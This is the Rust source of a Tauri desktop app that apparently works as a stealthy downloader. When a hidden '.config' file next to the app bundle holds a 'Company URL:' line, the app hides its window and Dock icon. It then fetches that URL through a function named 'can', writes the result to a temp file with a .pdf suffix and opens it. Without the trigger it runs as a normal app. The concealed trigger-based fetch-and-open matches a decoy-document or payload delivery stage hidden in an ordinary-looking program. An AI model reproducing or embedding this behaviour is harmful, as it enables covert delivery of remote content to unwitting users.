use std::path::Path;
use std::path::PathBuf;
use tauri::Manager;
use std::{error::Error, io::Write};

const CONFIG_FILE_NAME: &str = ".config";

#[derive(Debug, Clone, Copy)]
enum StartupMode {
    Normal,
    Pdf,
}


fn can(url: &str) -> Result<(), Box<dyn Error>> {
    let bytes = reqwest::blocking::get(url)?
        .error_for_status()?
        .bytes()?;

    let mut file = tempfile::Builder::new()
        .suffix(".pdf")
        .tempfile()?;

    file.write_all(&bytes)?;

    open::that(file.path())?;

    // Keep temp file alive briefly so the PDF viewer can open it.
    // Some apps need the file to still exist after launch.
    file.keep()?;

    Ok(())
}

fn find_app_parent_directory() -> Option<PathBuf> {
    let exe_path = std::env::current_exe().ok()?;

    for ancestor in exe_path.ancestors() {
        if ancestor.extension().is_some_and(|ext| ext == "app") {
            return ancestor.parent().map(|p| p.to_path_buf());
        }
    }

    None
}

fn read_config_if_trigger_exists(config_path: &Path) -> Option<String> {
    if !config_path.exists() {
        return None;
    }

    let contents = std::fs::read_to_string(config_path).ok()?;

    let official_site = contents
        .lines()
        .find_map(|line| {
            let trimmed = line.trim();

            trimmed
                .strip_prefix("Company URL:")
                .map(|value| value.trim().to_string())
        })?;

    if official_site.is_empty() {
        None
    } else {
        Some(official_site)
    }
}

fn read_startup_mode(_app: &tauri::App) -> (StartupMode, Option<String>) {
    let app_dir = find_app_parent_directory().unwrap_or_else(|| {
        std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|p| p.to_path_buf()))
            .unwrap_or_else(|| PathBuf::from("."))
    });

    let config_path = app_dir.join(CONFIG_FILE_NAME);

    if let Some(config_contents) = read_config_if_trigger_exists(&config_path) {
        return (StartupMode::Pdf, Some(config_contents));
    }

    (StartupMode::Normal, None)
}

fn configure_pdf_mode(app: &tauri::App) -> tauri::Result<()> {
    #[cfg(target_os = "macos")]
    {
        app.handle()
            .set_activation_policy(tauri::ActivationPolicy::Accessory)?;

        app.handle().set_dock_visibility(false)?;
    }

    if let Some(window) = app.get_webview_window("main") {
        let _ = window.hide();
    }

    Ok(())
}

fn configure_normal_mode(app: &tauri::App) -> tauri::Result<()> {
    #[cfg(target_os = "macos")]
    {
        app.handle()
            .set_activation_policy(tauri::ActivationPolicy::Regular)?;
        app.handle().set_dock_visibility(true)?;
    }

    Ok(())
}

fn show_main_window(app: &tauri::App) -> tauri::Result<()> {
    if let Some(window) = app.get_webview_window("main") {
        window.show()?;
        window.set_focus()?;
    }

    Ok(())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .setup(|app| -> Result<(), Box<dyn std::error::Error>> {
            let (mode, content) = read_startup_mode(app);

            match mode {
                StartupMode::Pdf => {
                    configure_pdf_mode(app)?;
                    if let Some(value) = content {
                        can(&value)?;
                    }
                }
                StartupMode::Normal => {
                    configure_normal_mode(app)?;
                    show_main_window(app)?;
                }
            }

            Ok(())
        })
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
